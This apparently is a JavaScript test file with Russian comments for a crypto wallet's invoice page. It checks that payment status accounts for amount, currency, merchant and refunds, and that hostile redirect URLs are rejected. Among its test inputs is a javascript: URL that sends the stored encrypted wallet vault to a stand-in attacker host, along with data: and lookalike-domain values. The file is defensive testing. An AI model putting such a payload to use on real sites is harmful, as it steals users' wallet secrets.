/* Счёт как источник опасности, а не только данных.

   Страница оплаты берёт ВСЁ из ссылки: адрес продавца, сумму, название
   магазина — и ещё два поля, про которые легко забыть: куда вести кнопку
   «открыть в кошельке» и куда возвращать после оплаты. Ссылку человеку
   присылает продавец, то есть кто угодно. Значит оба поля — это чужой
   текст, который попадает в переход браузера.

   Вписать туда javascript:… значит выполнить свой код НА НАШЕМ домене —
   там, где в памяти браузера лежит зашифрованный кошелёк. Поэтому здесь
   проверяется, что чужие адреса отбрасываются, а не «санитизируются».

   Вторая половина — ответ «оплачено ли». Раньше он сверял номер счёта и
   продавца. Номер счёта знает всякий, кому прислали ссылку: заплати по
   нему одну копейку — и магазин услышит «оплачено». Теперь сверяется и
   валюта, и сумма, и берётся это не из журнала событий (он видит только
   недавние блоки), а из памяти контракта — там суточный счёт находится так
   же, как минутный.

   Настоящую сеть отсюда не достать, поэтому узел поддельный, но все ответы
   он кодирует настоящим ABI. */
import { chromium } from 'playwright';
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'module';
import { start, state, paidLog, ADDR } from './mocknode.mjs';

const require = createRequire(import.meta.url);
const e = require('/home/claude/apk/www/lib/ethers.umd.min.js'); const E = e.ethers || e;

const R = (() => {
  const rows = [];
  return { ok(name, cond, detail){ rows.push(!!cond);
      console.log((cond ? 'OK   ' : 'ПРОВАЛ ') + name + (detail ? '  [' + detail + ']' : '')); },
    done(){ const bad = rows.filter(x => !x).length;
      console.log('\n--- ' + (rows.length - bad) + ' из ' + rows.length + ' ---');
      return bad === 0; } };
})();

const WWW = '/home/claude/apk/www';
const PORT = 8793;

// ================= копии страниц не должны расходиться =================
/* Страница счёта лежит в двух местах: настоящая в www и копия в папке
   шлюза, откуда её берут проверки шлюза. Копии расходятся молча — и тогда
   зелёная проверка means ничего: она проверяет прошлогодний файл. Здесь
   расхождение становится красным. */
for (const f of ['pay.html', 'invoice.html']){
  const a = fs.readFileSync(path.join(WWW, f));
  const b = fs.readFileSync('/home/claude/apk/gateway/public/' + f);
  R.ok('копия ' + f + ' у шлюза совпадает с настоящей', Buffer.compare(a, b) === 0,
       a.length + ' против ' + b.length + ' знаков');
}

// ================= поддельный узел и настоящий ответ «оплачено ли» =====
const srv = await start(8794);
state.payVersion = 2;
state.block = 200000;                       // сеть ушла далеко вперёд

const { onRequestGet } = await import('/home/claude/apk/functions/api/status.js');
const ENV = { TAVAROV_RPC: 'http://localhost:8794', TAVAROV_PAY: ADDR.pay };

const MERCH = '0x9bd90768c17f64b2c33d76bd9d4dd9df4755b77c';
const OTHER = '0x1111111111111111111111111111111111111111';
const INV   = '0x' + 'a1'.repeat(32);
const u6 = (v) => E.utils.parseUnits(String(v), 6);   // поддельный доллар шестизначный

const ask = async (q) => {
  const res = await onRequestGet({
    request: new Request('https://wallet.tavarov.com/api/status?' + q), env: ENV });
  return { code: res.status, body: await res.json() };
};
const query = (extra) => 'net=bnbTestnet&m=' + MERCH + '&h=' + INV + (extra || '');

// ---------- честная оплата ----------
state.sales[INV] = { merchant: MERCH, amount: u6('20'), buyer: OTHER,
                     refunded: 0, token: ADDR.usdt };
let r = await ask(query('&a=20&c=USDT'));
R.ok('ЧЕСТНАЯ ОПЛАТА ПРИЗНАНА ОПЛАТОЙ', r.body.paid === true, JSON.stringify(r.body).slice(0, 90));
R.ok('и видно, что ответ взят из памяти контракта, а не из журнала',
  r.body.source === 'sale', String(r.body.source));

/* Запись о покупке лежит в памяти контракта и не устаревает. Журнал видит
   только три тысячи последних блоков — суточный счёт по нему уже не
   найти, а такие счета продавцы выставляют. */
R.ok('СЧЁТ СУТОЧНОЙ ДАВНОСТИ НАХОДИТСЯ, ХОТЯ В ЖУРНАЛЕ ЕГО УЖЕ НЕТ',
  r.body.paid === true && r.body.tx === null, 'блок сети ' + state.block);

// ---------- недоплата ----------
/* Главное здесь. Номер счёта знает каждый, кому прислали ссылку. */
state.sales[INV] = { merchant: MERCH, amount: u6('0.01'), buyer: OTHER,
                     refunded: 0, token: ADDR.usdt };
r = await ask(query('&a=20&c=USDT'));
R.ok('КОПЕЙКА ПО ЧУЖОМУ НОМЕРУ СЧЁТА ОПЛАТОЙ НЕ СЧИТАЕТСЯ',
  r.body.paid === false && r.body.underpaid === true, JSON.stringify(r.body).slice(0, 110));
R.ok('и сказано, сколько пришло и сколько ждали',
  r.body.amount === u6('0.01').toString() && r.body.expected === u6('20').toString(),
  r.body.amount + ' против ' + r.body.expected);

/* А без суммы в запросе — старое поведение, и оно было дырой. Проверяем,
   что страница эту сумму действительно посылает (ниже), а здесь — что без
   неё мы хотя бы не врём про сумму. */
r = await ask(query(''));
R.ok('без суммы в запросе сверять нечем, и это видно по ответу',
  r.body.paid === true && r.body.source === 'sale');

// ---------- не та валюта ----------
state.sales[INV] = { merchant: MERCH, amount: u6('20'), buyer: OTHER,
                     refunded: 0, token: ADDR.token };     // заплатили TVR вместо USDT
r = await ask(query('&a=20&c=USDT'));
R.ok('ОПЛАТА ДРУГОЙ МОНЕТОЙ ОПЛАТОЙ НЕ СЧИТАЕТСЯ',
  r.body.paid === false && r.body.wrongToken === true, JSON.stringify(r.body).slice(0, 100));

// ---------- чужой продавец ----------
state.sales[INV] = { merchant: OTHER, amount: u6('20'), buyer: OTHER,
                     refunded: 0, token: ADDR.usdt };
r = await ask(query('&a=20&c=USDT'));
R.ok('счёт, оплаченный другому продавцу, нам не засчитывается', r.body.paid === false);

// ---------- возврат ----------
state.sales[INV] = { merchant: MERCH, amount: u6('20'), buyer: OTHER,
                     refunded: u6('20'), token: ADDR.usdt };
r = await ask(query('&a=20&c=USDT'));
R.ok('ВОЗВРАЩЁННЫЙ ПЛАТЁЖ ПЕРЕСТАЁТ БЫТЬ ОПЛАТОЙ',
  r.body.paid === false, JSON.stringify(r.body).slice(0, 100));

// ---------- ничего не платили ----------
delete state.sales[INV];
r = await ask(query('&a=20&c=USDT'));
R.ok('неоплаченный счёт так и остаётся неоплаченным', r.body.paid === false);

// ---------- старый контракт: остаётся журнал ----------
/* У первой версии памяти о покупках нет. Тогда журнал — единственное, что
   есть, и сверять сумму надо по нему. */
state.payVersion = 1;
state.block = 3200;
state.logs = [paidLog({ merchant: MERCH, payer: OTHER, token: ADDR.usdt,
  toMerchant: u6('0.0099'), fee: u6('0.0001'), reward: 0, invoice: INV, block: 3100 })];
r = await ask(query('&a=20&c=USDT'));
R.ok('НЕДОПЛАТА ЛОВИТСЯ И НА СТАРОМ КОНТРАКТЕ, ПО ЖУРНАЛУ',
  r.body.paid === false && r.body.underpaid === true, JSON.stringify(r.body).slice(0, 100));

state.logs = [paidLog({ merchant: MERCH, payer: OTHER, token: ADDR.usdt,
  toMerchant: u6('19.8'), fee: u6('0.2'), reward: 0, invoice: INV, block: 3100 })];
r = await ask(query('&a=20&c=USDT'));
R.ok('а полная оплата по журналу засчитывается',
  r.body.paid === true && r.body.source === 'logs', JSON.stringify(r.body).slice(0, 100));

// ---------- узел молчит ----------
srv.close();
await new Promise(r2 => setTimeout(r2, 300));
r = await ask(query('&a=20&c=USDT'));
R.ok('МОЛЧАНИЕ УЗЛА НЕ ВЫДАЁТСЯ ЗА «НЕ ОПЛАЧЕНО»',
  r.body.unknown === true && r.code === 502, 'код ' + r.code);

// ================= сама страница счёта =================
const srv2 = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://localhost:' + PORT);
  if (u.pathname === '/api/status'){
    asked.push(Object.fromEntries(u.searchParams));
    res.writeHead(200, { 'content-type':'application/json' });
    res.end(JSON.stringify(paid ? { paid:true, tx:'0x' + 'ab'.repeat(32) } : { paid:false }));
    return;
  }
  const rel = decodeURIComponent(u.pathname).replace(/^\/+/, '') || 'index.html';
  const file = path.join(WWW, rel);
  if (!file.startsWith(WWW) || !fs.existsSync(file)){ res.writeHead(404); res.end('нет'); return; }
  res.writeHead(200, { 'content-type': file.endsWith('.js')
    ? 'text/javascript; charset=utf-8' : 'text/html; charset=utf-8' });
  res.end(fs.readFileSync(file));
});
let paid = false, asked = [];
await new Promise(r2 => srv2.listen(PORT, r2));

const browser = await chromium.launch({
  executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome', args: ['--no-sandbox'] });
const ctx = await browser.newContext({ locale: 'ru-RU', viewport: { width: 520, height: 1000 } });
const page = await ctx.newPage();
const errors = [];
page.on('pageerror', e2 => errors.push(String(e2.message)));

const b64url = (s) => Buffer.from(s, 'utf8').toString('base64')
  .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
/* Счёт живёт в адресе после решётки, а переход, меняющий только решётку,
   страницу НЕ перезагружает: скрипт не запустится заново, и проверка будет
   смотреть на прошлый счёт, ничего не заметив. Поэтому у каждого захода
   свой номер в запросе. */
let visit = 0;
const openInvoice = async (extra) => {
  const inv = Object.assign({
    m: MERCH, a: '20', c: 'USDT', o: 'заказ-1', n: 'Кофейня', i: 'кофе',
    net: 'bnbTestnet', t: Math.floor(Date.now()/1000) + 900, h: INV }, extra);
  await page.goto('http://localhost:' + PORT + '/pay.html?v=' + (++visit) +
                  '#p=' + b64url(JSON.stringify(inv)), { waitUntil: 'load' });
  await page.waitForTimeout(350);
};

// ---------- куда ведёт кнопка «открыть в кошельке» ----------
await openInvoice({});
let href = await page.getAttribute('#openWallet', 'href');
R.ok('без своего адреса кнопка ведёт на наш кошелёк',
  href.startsWith('https://wallet.tavarov.com/?pay='), String(href).slice(0, 60));

await openInvoice({ w: 'javascript:fetch("//зло/"+localStorage.getItem("tavarov.vault.v1"))' });
href = await page.getAttribute('#openWallet', 'href');
R.ok('ЧУЖОЙ КОД В ПОЛЕ АДРЕСА КОШЕЛЬКА НЕ ДОХОДИТ ДО КНОПКИ',
  href.startsWith('https://wallet.tavarov.com/?pay='), String(href).slice(0, 70));

await openInvoice({ w: 'https://wallet.tavarov.com.зло.рф' });
href = await page.getAttribute('#openWallet', 'href');
R.ok('ПОХОЖИЙ, НО ЧУЖОЙ ДОМЕН ТОЖЕ НЕ ДОХОДИТ',
  href.startsWith('https://wallet.tavarov.com/?pay='), String(href).slice(0, 70));

await openInvoice({ w: 'https://tavarov-wallet.pages.dev' });
href = await page.getAttribute('#openWallet', 'href');
R.ok('а наш же запасной адрес принимается',
  href.startsWith('https://tavarov-wallet.pages.dev/?pay='), String(href).slice(0, 60));

// ---------- куда возвращают после оплаты ----------
const seenReturn = await page.evaluate(() => ({
  js:    safeReturnUrl('javascript:alert(1)'),
  data:  safeReturnUrl('data:text/html,<script>1</script>'),
  http:  safeReturnUrl('http://магазин.рф/ok'),
  creds: safeReturnUrl('https://кто:пароль@магазин.example/ok'),
  good:  safeReturnUrl('https://shop.example/spasibo')
}));
R.ok('ВОЗВРАТ ЧУЖИМ КОДОМ ОТБРОШЕН', seenReturn.js === null && seenReturn.data === null,
  JSON.stringify(seenReturn).slice(0, 90));
R.ok('возврат без https отброшен', seenReturn.http === null);
R.ok('возврат с паролем внутри адреса отброшен', seenReturn.creds === null);
R.ok('а обычный адрес магазина проходит', /^https:\/\/shop\.example\//.test(seenReturn.good || ''),
  String(seenReturn.good));

// ---------- что страница спрашивает у сервера ----------
asked = []; paid = false;
await openInvoice({});
await page.waitForTimeout(600);
R.ok('СТРАНИЦА СПРАШИВАЕТ НЕ ТОЛЬКО НОМЕР СЧЁТА, НО И СУММУ С ВАЛЮТОЙ',
  asked.length > 0 && asked[0].a === '20' && asked[0].c === 'USDT',
  JSON.stringify(asked[0] || {}));
R.ok('и номер счёта с продавцом, конечно, тоже',
  asked[0] && asked[0].h === INV && asked[0].m.toLowerCase() === MERCH.toLowerCase());

// ---------- счёт в тестовой сети ----------
/* Страница выставления счетов тестовую сеть больше не предлагает, но ссылку
   можно собрать руками — и мошеннику ровно это и нужно: деньги там
   ненастоящие и раздаются бесплатно, а экран «Оплачено» настоящий на вид.
   Покупатель обязан увидеть это до того, как что-то отдаст. */
await openInvoice({ net: 'bnbTestnet' });
const warned = await page.evaluate(() => {
  const b = document.getElementById('testnetWarn');
  return { shown: !b.classList.contains('hidden'), text: b.textContent };
});
R.ok('ПРО ТЕСТОВУЮ СЕТЬ ПОКУПАТЕЛЯ ПРЕДУПРЕЖДАЮТ ДО ОПЛАТЫ',
  warned.shown, warned.text.trim().slice(0, 70));
R.ok('и сказано прямо, что это обман, а не «особый режим»',
  /обманыва|ненастоящ/i.test(warned.text), warned.text.trim().slice(0, 110));

await openInvoice({ net: 'bnb' });
R.ok('а на обычном счёте этого предупреждения нет',
  await page.evaluate(() => document.getElementById('testnetWarn').classList.contains('hidden')));

// ---------- испорченный счёт ----------
await page.goto('http://localhost:' + PORT + '/pay.html?v=99#p=' + b64url('{"m":"мусор"}'),
                { waitUntil: 'load' });
await page.waitForTimeout(250);
R.ok('испорченный счёт показывает ошибку, а не пустую страницу',
  await page.isVisible('#err'));

const clean = errors.filter(x => !/Failed to load resource|net::ERR_FAILED/i.test(x));
if (clean.length) console.log('ОШИБКИ СТРАНИЦЫ: ' + clean.join(' | '));
const good = R.done() && clean.length === 0;
await browser.close(); srv2.close();
process.exit(good ? 0 : 1);
